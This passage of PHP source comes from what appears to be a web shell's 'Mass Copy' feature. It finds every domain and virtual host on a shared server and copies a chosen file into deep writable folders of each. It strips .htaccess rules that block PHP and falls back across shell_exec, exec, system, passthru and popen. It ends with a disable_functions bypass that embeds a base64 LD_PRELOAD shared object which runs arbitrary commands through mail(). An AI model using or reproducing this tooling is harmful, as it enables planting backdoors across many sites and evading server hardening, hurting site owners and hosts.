        'error' => empty($targets) ? 'DocumentRoot dari vhost tidak ditemukan / tidak readable.' : '',
    );
}

/**
 * Mode Mass Copy HARUS eksklusif: hanya satu dari v1|v2|v3.
 * Jika v2+v3 ikut terkirim, v3 menang (UI juga uncheck saling).
 */
function geckoMassPickMode($v2 = false, $v3 = false, $mode = '')
{
    $mode = strtolower(trim((string)$mode));
    if ($mode === 'v3' || $mode === '3' || $mode === 'vhost') return 'v3';
    if ($mode === 'v2' || $mode === '2' || $mode === 'system') return 'v2';
    if ($mode === 'v1' || $mode === '1' || $mode === 'folder') return 'v1';
    // fallback legacy boolean flags (saling eksklusif)
    if (!empty($v3)) return 'v3';
    if (!empty($v2)) return 'v2';
    return 'v1';
}

function geckoMassResolveTargets($base, $v2 = false, $v3 = false, $mode = '')
{
    $mode = geckoMassPickMode($v2, $v3, $mode);

    // Isolasi penuh: tiap mode hanya pakai resolver-nya sendiri
    if ($mode === 'v3') {
        return geckoMassResolveTargetsV3();
    }
    if ($mode === 'v2') {
        return geckoMassResolveTargetsV2();
    }

    // ─── v1 only ───
    $base = trim(str_replace('\\', '/', (string)$base));
    $baseLower = strtolower($base);

    // Alias legacy v1 → v2 (BUKAN v3). Jangan campur dengan sites-enabled.
    if ($base === '' || $baseLower === '@system' || $baseLower === 'system' || $baseLower === 'auto') {
        return geckoMassResolveTargetsV2();
    }
    // @vhost hanya valid lewat mode=v3; di v1 diabaikan agar tidak bentrok
    if ($baseLower === '@vhost' || $baseLower === 'vhost' || $baseLower === 'v3') {
        return array(
            'ok' => false,
            'mode' => 'folder',
            'method' => 'folder-scan',
            'targets' => array(),
            'error' => 'Base @vhost hanya untuk Mass Copy v3. Aktifkan checkbox v3.',
        );
    }

    $dirs = geckoMassFindDomains($base);
    $targets = array();
    foreach ($dirs as $dir) {
        $targets[] = array(
            'domain' => basename($dir),
            'user' => '',
            'domainDir' => $dir,
            'domains' => array(basename($dir)),
            'source' => 'folder',
        );
    }

    if (empty($targets)) {
        // fallback v1 kosong → v2 system saja (bukan v3)
        $fb = geckoMassResolveTargetsV2();
        if (!empty($fb['targets'])) {
            $fb['mode'] = 'system-fallback';
            return $fb;
        }
        return array(
            'ok' => false,
            'mode' => 'folder',
            'method' => 'folder-scan',
            'targets' => array(),
            'error' => 'Folder scan kosong dan sistem domain tidak terbaca.',
        );
    }

    return array(
        'ok' => true,
        'mode' => 'folder',
        'method' => 'folder-scan',
        'targets' => $targets,
        'error' => '',
    );
}

function geckoMassShellCopy($src, $dest)
{
    $cmd = 'cp ' . geckoEscapeshellarg($src) . ' ' . geckoEscapeshellarg($dest) . ' && echo __CPOK__';

    if (function_exists('shell_exec')) {
        $out = (string)@shell_exec($cmd);
        if (strpos($out, '__CPOK__') !== false) return true;
    }
    if (function_exists('exec')) {
        $lines = array();
        @exec($cmd, $lines);
        if (strpos(implode('', $lines), '__CPOK__') !== false) return true;
    }
    if (function_exists('system')) {
        ob_start();
        @system($cmd);
        $out = (string)ob_get_clean();
        if (strpos($out, '__CPOK__') !== false) return true;
    }
    if (function_exists('passthru')) {
        ob_start();
        @passthru($cmd);
        $out = (string)ob_get_clean();
        if (strpos($out, '__CPOK__') !== false) return true;
    }
    if (function_exists('popen') && function_exists('pclose')) {
        $h = @popen($cmd, 'r');
        if (is_resource($h)) {
            $out = (string)@fread($h, 256);
            @pclose($h);
            if (strpos($out, '__CPOK__') !== false) return true;
        }
    }
    // Last resort: temp script + proc_open cascade
    if (function_exists('geckoRunBashScriptFile')) {
        $r = geckoRunBashScriptFile($cmd, dirname($dest), 30);
        if (isset($r['output']) && strpos($r['output'], '__CPOK__') !== false) return true;
    }
    return false;
}

function geckoMassSmartCopy($src, $dest)
{
    if (@copy($src, $dest) && is_file($dest)) return 'copy';
    $content = @file_get_contents($src);
    if ($content !== false && @file_put_contents($dest, $content) !== false && is_file($dest)) {
        return 'fpc';
    }
    if (geckoMassShellCopy($src, $dest) && is_file($dest)) return 'shell';
    return false;
}

function geckoMassFindWritableDirs($root, $max = 8, $minDepth = 0, $maxDepth = 12)
{
    $skip = geckoMassSkipScan();
    $found = array();
    $scanned = 0;
    $minDepth = (int)$minDepth;
    $maxDepth = (int)$maxDepth;
    if ($minDepth < 0) $minDepth = 0;
    if ($maxDepth < 1) $maxDepth = 1;
    if ($maxDepth > 16) $maxDepth = 16;
    $root = rtrim(str_replace('\\', '/', (string)$root), '/');
    // DFS (array_pop) agar folder dalam lebih dulu terjamah
    $stack = array(array($root, 0));
    while ($stack && $scanned < 12000) {
        $item = array_pop($stack);
        $dir = $item[0];
        $depth = $item[1];
        $scanned++;
        if (!is_dir($dir) || !is_readable($dir)) continue;
        // v1: minDepth=2 → skip webroot & 1 level (cari "jauh")
        // v2: minDepth=0 → webroot boleh
        if ($depth >= $minDepth && @is_writable($dir)) {
            $found[] = array($dir, $depth);
        }
        if ($depth >= $maxDepth) continue;
        $subs = @scandir($dir);
        if (!is_array($subs)) continue;
        // urutkan nama agar scan lebih deterministik; push terbalik supaya DFS masuk deep
        $subs = array_values(array_filter($subs, function ($s) {
            return $s !== '.' && $s !== '..';
        }));
        sort($subs);
        $subs = array_reverse($subs);
        foreach ($subs as $s) {
            if (in_array($s, $skip, true)) continue;
            $p = $dir . '/' . $s;
            if (is_dir($p) && !is_link($p)) {
                $stack[] = array($p, $depth + 1);
            }
        }
    }
    usort($found, function ($a, $b) {
        if ($a[1] === $b[1]) return strcmp($a[0], $b[0]);
        return $b[1] - $a[1]; // deepest first
    });
    $dirs = array();
    foreach ($found as $f) {
        $dirs[] = $f[0];
    }
    return array_slice($dirs, 0, max(1, (int)$max));
}

function geckoMassGetWebRoot($domainDir)
{
    $domainDir = rtrim(str_replace('\\', '/', $domainDir), '/');
    foreach (geckoMassWebRoots() as $wr) {
        $p = $domainDir . '/' . $wr;
        if (@is_dir($p)) return $p;
    }
    return $domainDir;
}

function geckoMassBuildUrl($scheme, $domainName, $domainDir, $dest)
{
    $domainDir = rtrim(str_replace('\\', '/', $domainDir), '/');
    $dest = str_replace('\\', '/', $dest);
    foreach (geckoMassWebRoots() as $wr) {
        $prefix = $domainDir . '/' . $wr . '/';
        if (strpos($dest, $prefix) === 0) {
            return $scheme . '://' . $domainName . '/' . substr($dest, strlen($prefix));
        }
    }
    $rel = ltrim(substr($dest, strlen($domainDir)), '/');
    return $scheme . '://' . $domainName . '/' . $rel;
}

function geckoMassIsPhpBlocking($content)
{
    $content = (string)$content;
    if (preg_match('/php_flag\s+engine\s+off/i', $content)) return true;
    if (preg_match('/php_admin_flag\s+engine\s+off/i', $content)) return true;
    if (preg_match('/RemoveHandler\s+[^\n]*\.php/i', $content)) return true;
    if (preg_match('/RemoveType\s+[^\n]*\.php/i', $content)) return true;
    if (preg_match('/AddType\s+application\/octet-stream\s+[^\n]*\.php/i', $content)) return true;
    if (preg_match('/AddType\s+application\/x-httpd-txt\s+[^\n]*\.php/i', $content)) return true;
    if (preg_match('/<FilesMatch[^>]*\.php[^>]*>.*?Deny\s+from\s+all.*?<\/FilesMatch>/is', $content)) return true;
    return false;
}


/** Hapus .htaccess di satu direktori target (v1 & v2). Return: none|deleted|failed|cleared|missing */
function geckoMassRemoveDirHtaccess($dir)
{
    $dir = rtrim(str_replace('\\', '/', (string)$dir), '/');
    if ($dir === '') {
        return 'missing';
    }
    $ht = $dir . '/.htaccess';
    if (!@file_exists($ht)) {
        return 'none';
    }
    if (@unlink($ht)) {
        return 'deleted';
    }
    // coba kosongkan jika unlink gagal
    if (@is_writable($ht) && @file_put_contents($ht, '') !== false) {
        @unlink($ht);
        if (!@file_exists($ht)) {
            return 'deleted';
        }
        return 'cleared';
    }
    return 'failed';
}

function geckoMassClearPathHtaccess($domainDir, $targetDir)
{
    $domainDir = rtrim(str_replace('\\', '/', $domainDir), '/');
    $targetDir = rtrim(str_replace('\\', '/', $targetDir), '/');
    $rel = ltrim(substr($targetDir, strlen($domainDir)), '/');
    $parts = $rel !== '' ? explode('/', $rel) : array();
    $current = $domainDir;
    $dirs = array($current);
    foreach ($parts as $p) {
        $current .= '/' . $p;
        $dirs[] = $current;
    }
    foreach ($dirs as $dir) {
        $ht = $dir . '/.htaccess';
        if (!file_exists($ht)) continue;
        $content = @file_get_contents($ht);
        if ($content === false) continue;
        if (geckoMassIsPhpBlocking($content)) {
            if (!@unlink($ht)) return false;
        }
    }
    return true;
}

function geckoMassWriteAllowHtaccess($dir, $filename)
{
    $ht = rtrim(str_replace('\\', '/', $dir), '/') . '/.htaccess';
    $allow = "<FilesMatch '^(" . preg_quote($filename, '/') . ")$'>\n"
        . "Order allow,deny\n"
        . "Allow from all\n"
        . "</FilesMatch>\n"
        . "<FilesMatch \"^\\.\">\n"
        . "  Order allow,deny\n"
        . "  Deny from all\n"
        . "</FilesMatch>\n";
    if (file_exists($ht)) {
        $existing = @file_get_contents($ht);
        if ($existing !== false && !geckoMassIsPhpBlocking($existing)) {
            @file_put_contents($ht, $existing . "\n" . $allow);
            return;
        }
    }
    @file_put_contents($ht, $allow);
}

function geckoMassHttpStatus($url, $timeout = 3)
{
    $timeout = max(1, min(10, (int)$timeout));
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_NOBODY, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        @curl_exec($ch);
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return $code;
    }
    $ctx = stream_context_create(array(
        'http' => array(
            'method' => 'HEAD',
            'timeout' => $timeout,
            'ignore_errors' => true,
            'follow_location' => 1,
        ),
        'ssl' => array(
            'verify_peer' => false,
            'verify_peer_name' => false,
        ),
    ));
    $h = @get_headers($url, 0, $ctx);
    if (!$h || !isset($h[0])) return 0;
    if (preg_match('/\s(\d{3})\s/', $h[0], $m)) {
        return (int)$m[1];
    }
    return 0;
}

function geckoMassCopyRun($src, $base, $debug = false, $v2 = false, $limit = 40, $offset = 0, $v3 = false, $mode = '')
{
    @ignore_user_abort(true);
    @set_time_limit(90);
    @ini_set('max_execution_time', '90');
    @ini_set('memory_limit', '256M');

    $src = trim(str_replace('\\', '/', (string)$src));
    $base = trim(str_replace('\\', '/', (string)$base));
    $debug = (bool)$debug;
    // Satu mode saja — tidak boleh v2+v3 aktif bersamaan
    $mode = geckoMassPickMode($v2, $v3, $mode);
    $v2 = ($mode === 'v2');
    $v3 = ($mode === 'v3');
    $limit = (int)$limit;
    $offset = (int)$offset;
    if ($limit < 1) $limit = 1;
    if ($limit > 80) $limit = 80;
    if ($offset < 0) $offset = 0;

    $debugLog = array();
    $log = function ($msg) use ($debug, &$debugLog) {
        if ($debug) {
            $debugLog[] = (string)$msg;
        }
    };
    $started = microtime(true);
    $budgetSec = ($mode === 'v1') ? 80 : 55;

    if ($src === '') {
        return array('ok' => false, 'error' => 'Source file wajib diisi.');
    }
    if ($mode === 'v3') {
        $base = '@vhost';
    } elseif ($mode === 'v2') {
        $base = '@system';
    } elseif ($base === '') {
        return array('ok' => false, 'error' => 'Base path wajib diisi (atau aktifkan Mass Copy v2/v3).');
    }
    if (strpos($src, "\0") !== false || strpos($base, "\0") !== false) {
        return array('ok' => false, 'error' => 'Path mengandung karakter ilegal.');
    }
    if (!file_exists($src) || !is_file($src)) {
        return array('ok' => false, 'error' => 'File sumber tidak ditemukan: ' . $src);
    }
    if (!is_readable($src)) {
        return array('ok' => false, 'error' => 'File sumber tidak readable: ' . $src);
    }

    $filename = basename($src);
    $resolved = geckoMassResolveTargets($base, $v2, $v3, $mode);
    $log('Mode: ' . $mode . ' / resolve=' . (isset($resolved['mode']) ? $resolved['mode'] : '?') . ' / method: ' . (isset($resolved['method']) ? $resolved['method'] : '?'));
    if (empty($resolved['ok']) || empty($resolved['targets'])) {
        return array(
            'ok' => false,
            'error' => !empty($resolved['error']) ? $resolved['error'] : 'Tidak ada domain/user target.',
            'mode' => $mode,
            'v2' => $v2,
            'v3' => $v3,
            'debug_log' => $debug ? $debugLog : array(),
            'resolve' => $resolved,
        );
    }

    $allTargets = $resolved['targets'];
    $totalTargets = count($allTargets);
    $discoveredDomains = isset($resolved['discovered_domains']) ? (int)$resolved['discovered_domains'] : $totalTargets;
    $uniqueDocroots = isset($resolved['unique_docroots']) ? (int)$resolved['unique_docroots'] : $totalTargets;
    $targets = array_slice($allTargets, $offset, $limit);
    $domainCount = count($targets);
    $log('Discovered domains=' . $discoveredDomains . ' unique docroots=' . $uniqueDocroots);
    $log('Targets total=' . $totalTargets . ' batch offset=' . $offset . ' limit=' . $limit . ' size=' . $domainCount);

    $results = array();
    $skipped = 0;
    $processed = 0;
    $timedOut = false;

    foreach ($targets as $target) {
        if ((microtime(true) - $started) >= $budgetSec) {
            $timedOut = true;
            $log('STOP: time budget ' . $budgetSec . 's');
            break;
        }

        $domainDir = isset($target['domainDir']) ? $target['domainDir'] : '';
        $domainName = isset($target['domain']) ? $target['domain'] : '';
        $domainUser = isset($target['user']) ? $target['user'] : '';
        $altDomains = (isset($target['domains']) && is_array($target['domains'])) ? $target['domains'] : array($domainName);
        $log('--- user=' . $domainUser . ' domain=' . $domainName . ' ---');
        $log('  domainDir: ' . $domainDir);
        $processed++;

        if ($domainDir === '' || !@is_dir($domainDir)) {
            $log('  SKIP: public_html missing');
            $skipped++;
            continue;
        }

        // Reachability: v1 & v3 saja (v2 skip agar cepat)
        if ($mode !== 'v2') {
            $isLocal = (substr($domainName, -6) === '.local');
            if (!$isLocal) {
                $code = geckoMassHttpStatus('https://' . $domainName . '/', 2);
                if ($code < 200 || $code >= 500) {
                    $code = geckoMassHttpStatus('http://' . $domainName . '/', 2);
                    if ($code < 200 || $code >= 500) {
                        $log('  SKIP: domain not reachable');
                        $skipped++;
                        continue;
                    }
                }
            }
        }

        // webRoot: v1 cari public_html/...; v2/v3 pakai DocumentRoot langsung
        if ($mode === 'v1') {
            $webRoot = geckoMassGetWebRoot($domainDir);
        } else {
            $webRoot = $domainDir;
        }
        $log('  webRoot: ' . $webRoot);
        $candidates = array();

        if ($mode === 'v2') {
            // v2: webroot dulu (cepat), lalu beberapa nested
            if (@is_writable($webRoot)) {
                $candidates[] = $webRoot;
            }
            if (count($candidates) < 3) {
                $more = geckoMassFindWritableDirs($webRoot, 3, 0, 6);
                foreach ($more as $c) {
                    if (!in_array($c, $candidates, true)) {
                        $candidates[] = $c;
                    }
                    if (count($candidates) >= 3) break;
                }
            }
        } else {
            // v1 & v3: cari folder DALAM / jauh (depth>=2), deepest first
            $candidates = geckoMassFindWritableDirs($webRoot, 12, 2, 14);
            foreach ($candidates as $c) {
                $log('    cand depthish: ' . $c);
            }
            if (empty($candidates)) {
                $log('  no deep writable; fallback shallow');
                $candidates = geckoMassFindWritableDirs($webRoot, 6, 0, 4);
            }
        }
        $log('  writable: ' . count($candidates));
        if (empty($candidates)) {
            $log('  SKIP: no writable');
            $skipped++;
            continue;
        }

        $copied = false;
        foreach ($candidates as $targetDir) {
            // v1 & v2 sama: copy dulu (abaikan .htaccess dulu)
            $dest = rtrim($targetDir, '/') . '/' . $filename;
            $method = geckoMassSmartCopy($src, $dest);
            if (!$method) {
                $log('    SKIP: copy failed');
                continue;
            }
            $log('    copied: ' . $dest . ' [' . $method . ']');

            // Setelah copy: coba hapus .htaccess di dest; gagal tetap lanjut
            $htStatus = geckoMassRemoveDirHtaccess($targetDir);
            $log('    htaccess: ' . $htStatus . ' @ ' . $targetDir);

            $pathOk = (is_file($dest) && @filesize($dest) > 0);
            $url = '';
            $urlOk = false;
            $urlStatus = 0;
            $log('    check path: ' . ($pathOk ? 'OK' : 'FAIL') . ' size=' . (@filesize($dest) ? filesize($dest) : 0));

            // Valid/confirmed = file ada di disk; URL dicek & dilaporkan (boleh invalid)
            // Tidak unlink file bila URL gagal (sama seperti v2)
            $domainsTry = (isset($target['domains']) && is_array($target['domains'])) ? $target['domains'] : array();
            if (!in_array($domainName, $domainsTry, true) && $domainName !== '') {
                array_unshift($domainsTry, $domainName);
            }
            foreach ($altDomains as $ad) {
                if ($ad !== '' && !in_array($ad, $domainsTry, true)) {
                    $domainsTry[] = $ad;
                }
            }

            $picked = '';
            foreach ($domainsTry as $dTry) {
                if ($dTry === '' || substr($dTry, -6) === '.local') continue;
                $uHttps = geckoMassBuildUrl('https', $dTry, $domainDir, $dest);
                $st = geckoMassHttpStatus($uHttps, 2);
                $log('    check url https: ' . $uHttps . ' => ' . $st);
                if ($st === 200) {
                    $url = $uHttps;
                    $urlOk = true;
                    $urlStatus = 200;
                    $picked = $dTry;
                    break;
                }
                $uHttp = geckoMassBuildUrl('http', $dTry, $domainDir, $dest);
                $st2 = geckoMassHttpStatus($uHttp, 2);
                $log('    check url http: ' . $uHttp . ' => ' . $st2);
                if ($st2 === 200) {
                    $url = $uHttp;
                    $urlOk = true;
                    $urlStatus = 200;
                    $picked = $dTry;
                    break;
                }
                // simpan kandidat URL terakhir untuk ditampilkan meski invalid
                if ($url === '') {
                    $url = $uHttps;
                    $urlStatus = (int)$st;
                    $picked = $dTry;
                }
            }
            if ($picked !== '') {
                $domainName = $picked;
            }
            if ($url === '') {
                $url = $dest;
                $log('    check url: skipped (.local / no FQDN)');
            }

            $verified = $pathOk;
            if (!$verified) {
                $log('    SKIP: path invalid after copy');
                $skipped++;
                continue;
            }

            $results[] = array(
                'url' => $url,
                'dest' => $dest,
                'domain' => $domainName,
                'user' => $domainUser,
                'path' => $dest,
                'method' => $method,
                'path_ok' => $pathOk,
                'url_ok' => $urlOk,
                'url_status' => (int)$urlStatus,
                'htaccess' => $htStatus,
                'verified' => ($urlOk ? 'http' : ($pathOk ? 'file' : 'no')),
            );
            $copied = true;
            $log('    OK: path=' . ($pathOk ? 'valid' : 'invalid')
                . ' url=' . ($urlOk ? ('valid(' . $urlStatus . ')') : ('invalid(' . $urlStatus . ')'))
                . ' htaccess=' . $htStatus
                . ' => ' . $url);
            break;
        }
        if (!$copied) {
            $skipped++;
        }
    }

    $successUrls = array();
    foreach ($results as $r) {
        $successUrls[] = $r['url'];
    }

    if ($timedOut) {
        $nextOffset = $offset + $processed;
        $hasMore = $nextOffset < $totalTargets;
    } else {
        $nextOffset = $offset + $domainCount;
        $hasMore = $nextOffset < $totalTargets;
    }

    $modeLabel = ($mode === 'v3') ? 'Mass Copy v3' : (($mode === 'v2') ? 'Mass Copy v2' : 'Mass Copy');
    return array(
        'ok' => true,
        'source' => $src,
        'base' => $base,
        'mode' => $mode,
        'v2' => $v2,
        'v3' => $v3,
        'filename' => $filename,
        'resolve_mode' => isset($resolved['mode']) ? $resolved['mode'] : '',
        'resolve_method' => isset($resolved['method']) ? $resolved['method'] : '',
        'domain_count' => $totalTargets,
        'discovered_domains' => $discoveredDomains,
        'unique_docroots' => $uniqueDocroots,
        'batch_count' => $domainCount,
        'batch_offset' => $offset,
        'batch_limit' => $limit,
        'processed' => $processed,
        'next_offset' => $nextOffset,
        'has_more' => $hasMore,
        'partial' => $hasMore || $timedOut,
        'timed_out' => $timedOut,
        'confirmed' => count($successUrls),
        'skipped' => $skipped,
        'urls' => $successUrls,
        'details' => $results,
        'debug_log' => $debug ? $debugLog : array(),
        'elapsed' => round(microtime(true) - $started, 2),
        'message' => $modeLabel
            . ' · batch ' . $processed . '/' . $totalTargets
            . ' · confirmed ' . count($successUrls)
            . ($hasMore ? ' · lanjut offset=' . $nextOffset : ' · selesai')
            . ' · via ' . (isset($resolved['method']) ? $resolved['method'] : 'folder'),
    );
}


/**
 * Bypass disable_functions via LD_PRELOAD + mail() (Tools → Bypass Functions).
 * Payload .so embedded di manager.php (asal preload.php release64/release86).
 * Action unik: bypass_df — tidak bentrok dengan terminal/shell lain.
 */
function geckoBypassPayload64()
{
    return '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